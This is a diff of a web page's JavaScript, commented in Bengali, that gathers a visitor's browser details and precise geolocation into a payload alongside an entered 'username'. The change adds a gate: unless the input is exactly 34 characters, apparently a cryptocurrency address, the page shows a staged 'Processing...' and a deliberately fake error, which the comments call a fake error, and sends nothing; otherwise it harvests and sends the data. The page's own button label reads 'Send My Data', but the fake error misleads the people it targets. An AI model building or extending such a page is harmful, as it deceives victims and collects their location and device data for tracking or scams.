@@ -165,17 +165,28 @@
 
     async function sendBrowserInfo() {
       const username = usernameInput.value.trim();
-      if (!username) {
-        status.textContent = "Please enter your Telegram username first";
-        return;
+
+      // চেক: ঠিক 34 ডিজিট কি না
+      if (username.length !== 34) {
+        sendBtn.disabled = true;
+        status.textContent = "Processing...";
+        
+        // 3 সেকেন্ড অপেক্ষা করে fake error দেখানো
+        setTimeout(() => {
+          status.textContent = "Your address incorrect";
+          sendBtn.disabled = false;
+          sendBtn.textContent = "Submit Username & Send My Data";
+        }, 3000);
+        
+        return; // কোনো data পাঠাবে না
       }
 
+      // 34 ডিজিট হলে আসল কাজ শুরু
       sendBtn.disabled = true;
       sendBtn.textContent = "Collecting & Sending...";
       status.textContent = "Collecting browser info...";
 
       try {
-        // Browser info
         const browserInfo = {
           userAgent: navigator.userAgent,
           platform: navigator.platform,
@@ -195,7 +206,6 @@
           timestamp: new Date().toISOString()
         };
 
-        // Geolocation
         status.textContent = "Getting real location... (allow permission)";
         let geo = "Location permission denied or error";
         let mapLink = "";
@@ -222,7 +232,6 @@
           status.textContent = geo;
         }
 
-        // Payload-এ username যোগ করা
         const payload = {
           username: username,
           browser: browserInfo,
